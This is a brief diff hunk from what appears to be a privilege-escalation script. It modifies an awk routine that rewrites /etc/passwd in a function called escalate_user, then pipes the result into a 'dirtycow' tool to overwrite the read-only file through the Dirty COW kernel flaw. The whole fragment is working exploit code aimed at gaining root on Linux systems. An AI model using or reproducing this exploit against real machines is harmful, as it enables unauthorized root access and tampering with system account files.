@@ -56,10 +56,8 @@ escalate_user() {
 						printf $i
 					}
 
-					if (i != NF) printf FS;
+					if (i != NF) printf FS
 				}
-
-				printf RS
 			}' /etc/passwd \
 		| dirtycow -o "$offset" /etc/passwd
 }
